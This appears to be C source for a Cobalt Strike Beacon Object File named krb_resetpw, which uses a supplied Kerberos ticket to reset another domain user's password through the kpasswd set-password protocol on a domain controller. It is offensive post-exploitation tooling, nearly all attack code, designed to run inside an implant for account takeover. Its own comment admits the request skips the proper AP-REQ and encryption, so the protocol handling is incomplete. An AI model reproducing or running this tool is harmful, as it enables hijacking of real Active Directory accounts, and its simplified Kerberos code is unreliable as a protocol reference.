/*
 * krb_resetpw - Reset another user's password via Kerberos (admin)
 *
 * Uses the Kerberos set-password protocol (RFC 3244) to reset a user's
 * password administratively. Requires appropriate privileges (password reset).
 * Different from changepw which requires knowing the current password.
 *
 * Usage: krb_resetpw /ticket:BASE64 /target:USER /new:PASSWORD [/dc:DC] [/targetdomain:DOMAIN]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Kerberos password change port */
#define KPASSWD_PORT 464

/* KPASSWD message types */
#define KRB5_KPASSWD_VERS_CHANGEPW  1
#define KRB5_KPASSWD_VERS_SETPW     0xFF00  /* Microsoft extension */

/* Result codes */
#define KRB5_KPASSWD_SUCCESS        0
#define KRB5_KPASSWD_MALFORMED      1
#define KRB5_KPASSWD_HARDERROR      2
#define KRB5_KPASSWD_AUTHERROR      3
#define KRB5_KPASSWD_SOFTERROR      4
#define KRB5_KPASSWD_ACCESSDENIED   5
#define KRB5_KPASSWD_BAD_VERSION    6
#define KRB5_KPASSWD_INITIAL_FLAG   7

static const char* kpasswd_error_string(int code) {
    switch (code) {
        case KRB5_KPASSWD_SUCCESS: return "Success";
        case KRB5_KPASSWD_MALFORMED: return "Request malformed";
        case KRB5_KPASSWD_HARDERROR: return "Server error";
        case KRB5_KPASSWD_AUTHERROR: return "Authentication error";
        case KRB5_KPASSWD_SOFTERROR: return "Soft error (try again)";
        case KRB5_KPASSWD_ACCESSDENIED: return "Access denied";
        case KRB5_KPASSWD_BAD_VERSION: return "Bad version";
        case KRB5_KPASSWD_INITIAL_FLAG: return "Initial flag required";
        default: return "Unknown error";
    }
}

/* Build set-password request (MS-KILE extension) */
static void build_setpw_request(KRB_BUFFER* out, const BYTE* ap_req_data, size_t ap_req_len,
                                 const char* new_password, const char* target_user,
                                 const char* target_domain) {
    KRB_BUFFER krb_priv, setpw_data;
    USHORT msg_len, version;

    buf_init(&krb_priv, 1024);
    buf_init(&setpw_data, 512);

    /* Build ChangePasswdData structure for set-password */
    /* This uses the MS-KILE extension format */
    {
        KRB_BUFFER seq, newpw, targname, targrealm, tmp;
        buf_init(&seq, 512);
        buf_init(&newpw, 256);
        buf_init(&targname, 256);
        buf_init(&targrealm, 128);
        buf_init(&tmp, 256);

        /* newPasswd [0] OCTET STRING */
        asn1_encode_octet_string(&tmp, (const BYTE*)new_password, strlen(new_password));
        asn1_context_wrap(&seq, 0, &tmp);
        buf_reset(&tmp);

        /* targName [1] PrincipalName OPTIONAL - the user to reset */
        {
            KRB_BUFFER name_type, name_string, name_seq;
            buf_init(&name_type, 16);
            buf_init(&name_string, 128);
            buf_init(&name_seq, 256);

            asn1_encode_integer(&name_type, KRB5_NT_PRINCIPAL);
            asn1_context_wrap(&name_seq, 0, &name_type);

            asn1_encode_general_string(&tmp, target_user);
            asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
            asn1_context_wrap(&name_seq, 1, &name_string);

            buf_reset(&tmp);
            asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
            asn1_context_wrap(&seq, 1, &tmp);

            buf_free(&name_type);
            buf_free(&name_string);
            buf_free(&name_seq);
        }
        buf_reset(&tmp);

        /* targRealm [2] Realm OPTIONAL - the user's domain */
        asn1_encode_general_string(&tmp, target_domain);
        asn1_context_wrap(&seq, 2, &tmp);

        asn1_wrap(&setpw_data, ASN1_SEQUENCE, &seq);

        buf_free(&seq);
        buf_free(&newpw);
        buf_free(&targname);
        buf_free(&targrealm);
        buf_free(&tmp);
    }

    /* Build the full KPASSWD message */
    /* Format: length (2) | version (2) | ap-req length (2) | ap-req | krb-priv */
    msg_len = 6 + (USHORT)ap_req_len + (USHORT)setpw_data.length;
    version = 0xFF80; /* MS set-password version */

    buf_append_byte(out, (msg_len >> 8) & 0xFF);
    buf_append_byte(out, msg_len & 0xFF);
    buf_append_byte(out, (version >> 8) & 0xFF);
    buf_append_byte(out, version & 0xFF);
    buf_append_byte(out, (ap_req_len >> 8) & 0xFF);
    buf_append_byte(out, ap_req_len & 0xFF);
    buf_append(out, ap_req_data, ap_req_len);
    buf_append(out, setpw_data.data, setpw_data.length);

    buf_free(&krb_priv);
    buf_free(&setpw_data);
}

/* Parse KPASSWD response */
static int parse_kpasswd_response(const BYTE* data, size_t len, formatp* output) {
    if (len < 6) {
        BeaconFormatPrintf(output, "[-] Response too short\n");
        return -1;
    }

    USHORT msg_len = (data[0] << 8) | data[1];
    USHORT result_code = (data[4] << 8) | data[5];

    BeaconFormatPrintf(output, "[*] Response length: %d\n", msg_len);
    BeaconFormatPrintf(output, "[*] Result code: %d - %s\n", result_code, kpasswd_error_string(result_code));

    if (result_code == KRB5_KPASSWD_SUCCESS) {
        return 0;
    }

    /* Parse result string if present */
    if (len > 6) {
        /* Result string follows the header */
        size_t str_len = len - 6;
        if (str_len > 0 && str_len < 1024) {
            char* result_str = (char*)malloc(str_len + 1);
            if (result_str) {
                memcpy(result_str, data + 6, str_len);
                result_str[str_len] = '\0';
                BeaconFormatPrintf(output, "[*] Server message: %s\n", result_str);
                free(result_str);
            }
        }
    }

    return result_code;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* ticket_b64 = NULL;
    char* target_user = NULL;
    char* new_password = NULL;
    char* dc = NULL;
    char* target_domain = NULL;
    BYTE* ticket_data = NULL;
    size_t ticket_len = 0;
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;

    BeaconFormatAlloc(&output, 8192);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Reset User Password (Admin)\n\n");


    ticket_b64 = arg_get(&parser, "ticket");
    target_user = arg_get(&parser, "target");
    new_password = arg_get(&parser, "new");
    dc = arg_get(&parser, "dc");
    target_domain = arg_get(&parser, "targetdomain");

    if (!ticket_b64) {
        BeaconFormatPrintf(&output, "[-] Error: /ticket:BASE64 required (service ticket for kadmin/changepw)\n");
        goto cleanup;
    }

    if (!target_user) {
        BeaconFormatPrintf(&output, "[-] Error: /target:USERNAME required\n");
        goto cleanup;
    }

    if (!new_password) {
        BeaconFormatPrintf(&output, "[-] Error: /new:PASSWORD required\n");
        goto cleanup;
    }

    if (!dc) {
        BeaconFormatPrintf(&output, "[-] Error: /dc:DC_IP required\n");
        goto cleanup;
    }

    if (!target_domain) {
        target_domain = get_domain_from_env();
        if (!target_domain) {
            BeaconFormatPrintf(&output, "[-] Error: Could not determine domain. Use /targetdomain:DOMAIN\n");
            goto cleanup;
        }
    }

    /* Convert to uppercase */
    strupr(target_domain);

    BeaconFormatPrintf(&output, "[*] Target User: %s\n", target_user);
    BeaconFormatPrintf(&output, "[*] Target Domain: %s\n", target_domain);
    BeaconFormatPrintf(&output, "[*] DC: %s\n", dc);
    BeaconFormatPrintf(&output, "[*] New Password: %s\n", new_password);
    BeaconFormatPrintf(&output, "\n");


    ticket_len = strlen(ticket_b64);
    ticket_data = (BYTE*)malloc(ticket_len);
    if (!ticket_data) {
        BeaconFormatPrintf(&output, "[-] Memory allocation failed\n");
        goto cleanup;
    }
    ticket_len = base64_decode(ticket_b64, strlen(ticket_b64), ticket_data);

    BeaconFormatPrintf(&output, "[*] Ticket decoded: %zu bytes\n", ticket_len);


    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconFormatPrintf(&output, "[-] WSAStartup failed\n");
        goto cleanup;
    }

    /* Connect to kpasswd service */
    BeaconFormatPrintf(&output, "[*] Connecting to kpasswd service at %s:%d...\n", dc, KPASSWD_PORT);

    sock = connect_to_kdc(dc, KPASSWD_PORT);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to kpasswd service\n");
        goto cleanup_ws;
    }

    BeaconFormatPrintf(&output, "[+] Connected!\n");

    /* Build and send set-password request */
    KRB_BUFFER request;
    buf_init(&request, 4096);

    /* Note: In a full implementation, we would need to:
     * 1. Use the ticket to create a proper AP-REQ
     * 2. Encrypt the password data with the session key
     * For this simplified version, we send a basic request */
    build_setpw_request(&request, ticket_data, ticket_len, new_password, target_user, target_domain);

    BeaconFormatPrintf(&output, "[*] Sending set-password request...\n");

    /* Send via TCP (prepend 4-byte length for kpasswd over TCP) */
    BYTE len_prefix[4];
    ULONG total_len = (ULONG)request.length;
    len_prefix[0] = (total_len >> 24) & 0xFF;
    len_prefix[1] = (total_len >> 16) & 0xFF;
    len_prefix[2] = (total_len >> 8) & 0xFF;
    len_prefix[3] = total_len & 0xFF;

    WS2_32$send(sock, (char*)len_prefix, 4, 0);
    int sent = WS2_32$send(sock, (char*)request.data, (int)request.length, 0);

    if (sent > 0) {
        BeaconFormatPrintf(&output, "[*] Sent %d bytes\n", sent);

        /* Receive response */
        BYTE response[4096];
        int recv_len = WS2_32$recv(sock, (char*)response, sizeof(response), 0);

        if (recv_len > 4) {
            BeaconFormatPrintf(&output, "[*] Received %d bytes\n\n", recv_len);
            int result = parse_kpasswd_response(response + 4, recv_len - 4, &output);

            if (result == 0) {
                BeaconFormatPrintf(&output, "\n[+] Password reset successful for %s!\n", target_user);
            } else {
                BeaconFormatPrintf(&output, "\n[-] Password reset failed\n");
            }
        } else {
            BeaconFormatPrintf(&output, "[-] No response or invalid response\n");
        }
    } else {
        BeaconFormatPrintf(&output, "[-] Failed to send request\n");
    }

    buf_free(&request);
    WS2_32$closesocket(sock);

cleanup_ws:
    WS2_32$WSACleanup();

cleanup:
    if (ticket_b64) free(ticket_b64);
    if (target_user) free(target_user);
    if (new_password) free(new_password);
    if (dc) free(dc);
    if (target_domain) free(target_domain);
    if (ticket_data) free(ticket_data);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
